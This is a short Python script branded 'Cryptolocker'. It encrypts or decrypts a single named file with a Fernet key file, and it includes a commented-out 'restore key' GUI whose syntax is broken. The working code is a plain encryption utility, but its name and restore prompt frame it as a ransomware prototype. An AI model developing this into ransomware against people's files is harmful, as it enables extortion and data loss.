


from cryptography.fernet import Fernet

# def restore():
#     restore_gui = Tk()
#     restore_gui.title('PlOszukiwacz Cryptolocker')
#     restore_gui.geometry("1000x100")
#     restore_key_label = Entry(restore_gui, font=("Helvetica", 24), bd=0, bg="systembuttonface", width=100)
#     restore_key_label.pack(pady=10, padx=50)
#     restore_key_label.insert(0, "Enter Your Restore Key")
#     restore_yes = Button(restore_gui, text="Restore", font=("Helvetica", 32), command=open("key.key", "wb") as key_file: key_file.write(restore_key_label))
#     restore_yes.pack(pady=50)

def write_key(file):
    key = Fernet.generate_key()
    with open(file, "wb") as key_file:
        key_file.write(key)


def load_key(key_file):
    """
        Loads the key
    """
    return open(key_file, "rb").read()

def encrypt(filename, key_file):
    """
    Given a filename (str) and key (bytes), it encrypts the file and write it
    """
    f = Fernet(load_key(key_file))
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def decrypt(filename, key_file): 
    """
    Given a filename (str) and key (bytes), it decrypts the file and write it
    """
    f = Fernet(load_key(key_file))
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    decrypted_data = f.decrypt(encrypted_data)
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)

    

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Cryptolocker by PlOszukiwacz")
    parser.add_argument("file", help="File to encrypt/decrypt")
    parser.add_argument("-g", "--generate-key", dest="generate_key", action="store_true",
                        help="Whether to generate a new key or use existing")
    parser.add_argument("-e", "--encrypt", action="store_true",
                        help="Whether to encrypt the file, only -e or -d can be specified.")
    parser.add_argument("-d", "--decrypt", action="store_true",
                        help="Whether to decrypt the file, only -e or -d can be specified.")
    parser.add_argument("-k", "--key-file", help="Key to load")

    args = parser.parse_args()
    file = args.file
    generate_key = args.generate_key
    key_file = args.key_file

    if generate_key:
        write_key(file)
        print("Key Generated!")
        exit()
    # load the key
    key = load_key(key_file)

    encrypt_ = args.encrypt
    decrypt_ = args.decrypt

    if encrypt_ and decrypt_:
        print("Please specify whether you want to encrypt the file or decrypt it.")
    elif encrypt_:
        encrypt(file, key_file)
    elif decrypt_:
        decrypt(file, key_file)
    else:
        print("Please specify whether you want to encrypt the file or decrypt it.")